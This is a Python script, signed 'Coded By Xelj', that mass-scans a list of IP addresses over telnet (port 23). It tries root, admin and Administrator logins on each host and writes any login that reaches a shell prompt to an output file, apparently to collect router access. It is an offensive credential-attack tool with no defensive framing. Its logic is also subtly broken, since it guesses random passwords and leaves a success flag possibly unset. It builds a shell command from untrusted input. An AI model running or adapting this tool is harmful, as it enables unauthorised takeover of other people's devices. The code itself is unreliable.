import threading
import sys
import os
import re
import time
import socket
from queue import Queue
from sys import stdout
import random
import string

if len(sys.argv) < 4:
    print("Usage: python " + sys.argv[0] + " <list> <threads> <output file>")
    sys.exit()

ips = open(sys.argv[1], "r").readlines()
threads = int(sys.argv[2])
output_file = sys.argv[3]
queue = Queue()
queue_count = 0

for ip in ips:
    queue_count += 1
    stdout.write("\r[%d] Coded By Xelj" % queue_count)
    stdout.flush()
    queue.put(ip)
print("\n")

def generate_random_password():
    length = random.randint(8, 16)  # Random password length between 8 and 16
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for _ in range(length))

class Router(threading.Thread):
    def __init__(self, ip):
        threading.Thread.__init__(self)
        self.ip = str(ip).rstrip('\n')

    def run(self):
        usernames = ["root", "admin", "Administrator"]
        random.shuffle(usernames)  # Shuffle the usernames list for random selection
        for username in usernames:
            password = generate_random_password()
            try:
                tn = socket.socket()
                tn.settimeout(8)
                tn.connect((self.ip, 23))
            except Exception:
                tn.close()
                break
            try:
                hoho = ''
                hoho += read_until(tn, "ogin:")
                if "ogin" in hoho:
                    tn.send(username + "\n")
                    time.sleep(0.09)
            except Exception:
                tn.close()
            try:
                hoho = ''
                hoho += read_until(tn, "assword:")
                if "assword" in hoho:
                    tn.send(password + "\n")
                    time.sleep(0.8)
                else:
                    pass
            except Exception:
                tn.close()
            try:
                prompt = ''
                prompt += tn.recv(40960)
                if ">" in prompt and "ONT" not in prompt:
                    success = True
                elif "#" in prompt or "$" in prompt or "%" in prompt or "@" in prompt:
                    success = True
                else:
                    tn.close()
                if success:
                    try:
                        os.system("echo " + self.ip + ":23 " + username + ":" + password + " >> " + output_file + "")
                        print("\033[37m[\033[32m+\033[37m] \033[33mRoted \033[37m-> \033[32m%s\033[37m:\033[32m%s\033[37m:\033[33m%s\033[37m" % (
                            username, password, self.ip))
                        tn.close()
                        break
                    except:
                        tn.close()
                else:
                    tn.close()
            except Exception:
                tn.close()

def read_until(tn, string, timeout=8):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.01)
        if string in buf:
            return buf
    raise Exception('TIMEOUT!')

def worker():
    try:
        while True:
            try:
                IP = queue.get()
                thread = Router(IP)
                thread.start()
                queue.task_done()
                time.sleep(0.02)
            except:
                pass
    except:
        pass

for _ in range(threads):
    try:
        t = threading.Thread(target=worker)
        t.start()
    except:
        pass
